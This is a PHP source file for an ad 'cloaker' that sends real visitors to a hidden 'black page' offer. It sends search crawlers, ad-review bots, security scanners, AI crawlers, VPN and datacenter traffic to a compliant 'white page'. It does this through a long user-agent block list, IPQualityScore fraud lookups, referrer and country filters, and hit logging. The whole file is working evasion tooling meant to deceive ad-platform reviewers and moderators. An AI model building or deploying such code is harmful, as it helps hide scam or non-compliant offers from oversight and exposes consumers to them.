<?php
/**
 * Cloaker Router Script
 *
 * Deploy this at:  https://cdn.trustednutraproduct.com/cloak.php
 * Ad destination:  https://cdn.trustednutraproduct.com/cloak.php?d=yourdomain.com
 *
 * Real users  → black page (your actual offer)
 * Bots/review → white page (safe, compliant page)
 */

require_once __DIR__ . '/config.php';

// ─────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────

function getVisitorIP(): string {
    $candidates = [
        'HTTP_CF_CONNECTING_IP',   // Cloudflare
        'HTTP_X_FORWARDED_FOR',    // Load balancers / proxies
        'HTTP_X_REAL_IP',          // Nginx proxy
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR',
    ];
    foreach ($candidates as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(explode(',', $_SERVER[$key])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP,
                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function isBotByUserAgent(string $ua): bool {
    if (strlen(trim($ua)) < 10) return true;   // Suspiciously short / empty UA

    $patterns = [
        // Search engine crawlers
        'googlebot', 'adsbot-google', 'google-pagerenderer', 'google-inspectiontool',
        'mediapartners-google', 'googleadsbot', 'apis-google',
        'bingbot', 'msnbot', 'adidxbot',
        'slurp',          // Yahoo
        'duckduckbot',
        'baiduspider',
        'yandexbot', 'yandexmobilebot',
        'sogou',
        'exabot',
        // Social / unfurl bots
        'facebookexternalhit', 'facebot', 'facebookcatalog',
        'twitterbot',
        'linkedinbot',
        'pinterestbot', 'pinterest/',
        'whatsapp',
        'telegrambot',
        'slackbot', 'slack-imgproxy',
        'discordbot',
        'vkshare',
        'applebot',
        // SEO / audit tools
        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'blexbot',
        'rogerbot', 'screaming frog', 'seobilitybot',
        'petalbot', 'bytespider',
        // Security scanners
        'nikto', 'nmap', 'masscan', 'nessus', 'openvas',
        'dirbuster', 'sqlmap', 'wfuzz', 'gobuster',
        // Archive / research
        'ia_archiver', 'archive.org_bot', 'wayback',
        // AI / LLM
        'claudebot', 'anthropic-ai', 'gptbot', 'chatgpt-user', 'openai',
        'cohere-ai', 'perplexitybot',
        // Generic automation
        'curl', 'wget', 'python-requests', 'python-urllib', 'python/',
        'java/', 'go-http-client', 'go/',
        'postmanruntime', 'insomnia', 'httpie', 'restsharp',
        'axios/', 'node-fetch', 'node/',
        'httpclient', 'apache-httpclient',
        // Ad network verification
        'adsbot', 'adscrawler', 'admantx',
        // Generic
        'crawler', 'spider', 'scraper', 'fetcher', 'archiver',
        'bot/', '/bot', 'bot.',
    ];

    $ua = strtolower($ua);
    foreach ($patterns as $p) {
        if (strpos($ua, $p) !== false) return true;
    }
    return false;
}

function queryIPQS(string $ip, string $apiKey): array {
    $url = sprintf(
        'https://www.ipqualityscore.com/api/json/ip/%s/%s' .
        '?strictness=1&allow_public_access_points=true&fast=true&lighter_penalties=false&mobile=true',
        $apiKey,
        urlencode($ip)
    );
    $ctx = stream_context_create([
        'http' => [
            'timeout'       => 4,
            'ignore_errors' => true,
        ]
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false) return [];
    return json_decode($raw, true) ?? [];
}

function doRedirect(string $url): void {
    // Prevent caching so every hit is evaluated fresh
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Location: ' . $url, true, 302);
    exit;
}

// ─────────────────────────────────────────────────────────────────
// Collect request data
// ─────────────────────────────────────────────────────────────────

$domain = trim($_GET['d'] ?? '');
$ua     = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500);
$ref    = substr($_SERVER['HTTP_REFERER']    ?? '', 0, 500);
$ip     = getVisitorIP();

// ─────────────────────────────────────────────────────────────────
// Load domain config from DB
// ─────────────────────────────────────────────────────────────────

$pdo = getDB();

if (empty($domain)) {
    http_response_code(400);
    exit('Missing domain parameter.');
}

$stmt = $pdo->prepare("SELECT * FROM cloaker_configs WHERE domain = ? LIMIT 1");
$stmt->execute([$domain]);
$cfg = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$cfg) {
    http_response_code(404);
    exit('Domain not configured.');
}

// If cloaker is paused for this domain → always show white page
if ((int)$cfg['is_active'] === 0) {
    doRedirect($cfg['white_page_url']);
}

// ─────────────────────────────────────────────────────────────────
// Decision logic
// ─────────────────────────────────────────────────────────────────

$routeTo    = 'black';   // assume real user until proven otherwise
$reason     = '';
$fraudScore = 0;
$isVpn      = 0;
$isBot      = 0;
$country    = '';

// 1. ── User-Agent bot detection ───────────────────────────────────
if ((int)$cfg['filter_bots'] && isBotByUserAgent($ua)) {
    $routeTo = 'white';
    $reason  = 'bot_ua';
    $isBot   = 1;
}

// 2. ── Manual IP blacklist ────────────────────────────────────────
if ($routeTo === 'black' && !empty($cfg['ip_blacklist'])) {
    $blacklisted = array_filter(array_map('trim', explode("\n", $cfg['ip_blacklist'])));
    if (in_array($ip, $blacklisted, true)) {
        $routeTo = 'white';
        $reason  = 'blacklisted_ip';
    }
}

// 3. ── Referrer whitelist ─────────────────────────────────────────
if ($routeTo === 'black' && !empty($cfg['allowed_referrers'])) {
    $allowed = array_filter(array_map('trim', explode(',', $cfg['allowed_referrers'])));
    if (!empty($allowed)) {
        $matched = false;
        foreach ($allowed as $a) {
            if ($a !== '' && stripos($ref, $a) !== false) {
                $matched = true;
                break;
            }
        }
        if (!$matched) {
            $routeTo = 'white';
            $reason  = 'bad_referrer';
        }
    }
}

// 4. ── IPQualityScore check ───────────────────────────────────────
//    Only call IPQS if at least one IPQS-based filter is enabled
$needsIPQS = (int)$cfg['filter_vpn']
          || (int)$cfg['filter_datacenter']
          || (int)$cfg['ipqs_threshold'] > 0;

if ($routeTo === 'black' && $needsIPQS) {
    $ipqs = queryIPQS($ip, IPQS_API_KEY);

    if (!empty($ipqs) && ($ipqs['success'] ?? false)) {
        $fraudScore   = (int)($ipqs['fraud_score']    ?? 0);
        $isVpn        = (($ipqs['vpn']   ?? false) || ($ipqs['proxy'] ?? false)) ? 1 : 0;
        $isDatacenter = (isset($ipqs['connection_type'])
                        && strtolower($ipqs['connection_type']) === 'hosting') ? 1 : 0;
        $isCrawler    = ($ipqs['is_crawler'] ?? false) ? 1 : 0;
        $country      = strtoupper($ipqs['country_code'] ?? '');

        if ($isCrawler) {
            $isBot = 1;
        }

        if ((int)$cfg['filter_vpn'] && $isVpn) {
            $routeTo = 'white';
            $reason  = 'vpn_proxy';
        } elseif ((int)$cfg['filter_datacenter'] && $isDatacenter) {
            $routeTo = 'white';
            $reason  = 'datacenter';
        } elseif ((int)$cfg['filter_bots'] && $isCrawler) {
            $routeTo = 'white';
            $reason  = 'bot_ipqs';
        } elseif ($fraudScore >= (int)$cfg['ipqs_threshold'] && (int)$cfg['ipqs_threshold'] > 0) {
            $routeTo = 'white';
            $reason  = 'fraud_score';
        }

        // 5. ── Blocked countries ──────────────────────────────────
        if ($routeTo === 'black' && !empty($cfg['blocked_countries']) && $country !== '') {
            $blocked = array_filter(array_map(
                fn($c) => strtoupper(trim($c)),
                explode(',', $cfg['blocked_countries'])
            ));
            if (in_array($country, $blocked, true)) {
                $routeTo = 'white';
                $reason  = 'blocked_country';
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────
// Log the visit
// ─────────────────────────────────────────────────────────────────

try {
    $ins = $pdo->prepare("
        INSERT INTO cloaker_logs
            (domain, ip, user_agent, referrer, country, fraud_score, is_vpn, is_bot, routed_to, reason)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ");
    $ins->execute([$domain, $ip, $ua, $ref, $country, $fraudScore, $isVpn, $isBot, $routeTo, $reason]);

    // Update running counters on the config row
    if ($routeTo === 'white') {
        $pdo->prepare("
            UPDATE cloaker_configs
            SET hits_total = hits_total + 1, hits_white = hits_white + 1, last_hit = NOW()
            WHERE domain = ?
        ")->execute([$domain]);
    } else {
        $pdo->prepare("
            UPDATE cloaker_configs
            SET hits_total = hits_total + 1, hits_black = hits_black + 1, last_hit = NOW()
            WHERE domain = ?
        ")->execute([$domain]);
    }
} catch (Exception $e) {
    // Logging should never break the redirect — fail silently
}

// ─────────────────────────────────────────────────────────────────
// Redirect
// ─────────────────────────────────────────────────────────────────

doRedirect($routeTo === 'white' ? $cfg['white_page_url'] : $cfg['black_page_url']);
